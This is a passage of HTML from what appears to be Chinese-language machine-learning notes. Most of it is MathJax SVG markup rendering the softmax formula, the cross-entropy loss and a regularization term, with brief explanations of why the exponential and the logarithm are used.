83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(3084,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(3612,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4001,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4844.3,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5511.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(6566.9,0)\"><g data-mml-node=\"msup\" transform=\"translate(839.1,394) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,472.1) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-307.4)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-370.3) scale(0.707)\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(1674.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,359) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-340.4)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></g></g><rect width=\"2308.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>为什么用 e 指数？</p>\n<ul>\n<li>放大差异，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.152ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"7.603ex\" height=\"2.038ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 3360.7 900.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msup\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(499,363) scale(0.707)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1180.3,0)\"><path data-c=\"226B\" d=\"M55 539T55 547T60 561T74 567Q81 567 207 498Q297 449 365 412Q633 265 636 261Q639 255 639 250Q639 241 626 232Q614 224 365 88Q83 -65 79 -66Q76 -67 73 -67Q65 -67 60 -61T55 -47Q55 -39 61 -33Q62 -33 95 -15T193 39T320 109L321 110H322L323 111H324L325 112L326 113H327L329 114H330L331 115H332L333 116L334 117H335L336 118H337L338 119H339L340 120L341 121H342L343 122H344L345 123H346L347 124L348 125H349L351 126H352L353 127H354L355 128L356 129H357L358 130H359L360 131H361L362 132L363 133H364L365 134H366L367 135H368L369 136H370L371 137L372 138H373L374 139H375L376 140L378 141L576 251Q63 530 62 533Q55 539 55 547ZM360 539T360 547T365 561T379 567Q386 567 512 498Q602 449 670 412Q938 265 941 261Q944 255 944 250Q944 241 931 232Q919 224 670 88Q388 -65 384 -66Q381 -67 378 -67Q370 -67 365 -61T360 -47Q360 -39 366 -33Q367 -33 400 -15T498 39T625 109L626 110H627L628 111H629L630 112L631 113H632L634 114H635L636 115H637L638 116L639 117H640L641 118H642L643 119H644L645 120L646 121H647L648 122H649L650 123H651L652 124L653 125H654L656 126H657L658 127H659L660 128L661 129H662L663 130H664L665 131H666L667 132L668 133H669L670 134H671L672 135H673L674 136H675L676 137L677 138H678L679 139H680L681 140L683 141L881 251Q368 530 367 533Q360 539 360 547Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(2458.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(499,363) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g></svg></mjx-container></span>\n，高得分能有更高概率</li>\n<li>更稳定，不用特殊处理0、负值等情况</li>\n<li>数学本质推导，这是从<strong>信息论</strong>中推导出来的“最自然的归一化”结果。在所有满足约束的分布中，信息熵最大的就是\nSoftmax 形式。</li>\n</ul>\n<p>损失函数取对数：</p>\n<p><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -1.581ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"18.924ex\" height=\"4.181ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1149.5 8364.3 1848.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1285.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2341.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3286.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(4564.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mrow\" transform=\"translate(4730.8,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"28\" d=\"M180 96T180 250T205 541T266 770T353 944T444 1069T527 1150H555Q561 1144 561 1141Q561 1137 545 1120T504 1072T447 995T386 878T330 721T288 513T272 251Q272 133 280 56Q293 -87 326 -209T399 -405T475 -531T536 -609T561 -640Q561 -643 555 -649H527Q483 -612 443 -568T353 -443T266 -270T205 -41Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(597,0)\"><g data-mml-node=\"msup\" transform=\"translate(658.1,394) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,441.7) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(502,-150)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-307.4)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-394.8) scale(0.707)\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"msup\" transform=\"translate(1597,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,472.1) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-307.4)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g></g><rect width=\"2199.4\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(3036.4,0) translate(0 -0.5)\"><path data-c=\"29\" d=\"M35 1138Q35 1150 51 1150H56H69Q113 1113 153 1069T243 944T330 771T391 541T416 250T391 -40T330 -270T243 -443T152 -568T69 -649H56Q43 -649 39 -647T35 -637Q65 -607 110 -548Q283 -316 316 56Q324 133 324 251Q324 368 316 445Q278 877 48 1123Q36 1137 35 1138Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>为什么取对数？</p>\n<ul>\n<li>因为高概率 softmax 接近 1，log 就越小。</li>\n<li>最大似然推导出来的结果，</li>\n</ul>\n<h2 id=\"正则化\">正则化</h2>\n<p>正则化的目标是让权重尽量简单。</p>\n<p>分类问题中，即让分割线更平滑/简单**。</p>\n<p>方法是在损失函数中增加一个尾项 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.848ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 2585 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D445\" d=\"M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(759,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1148,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2196,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 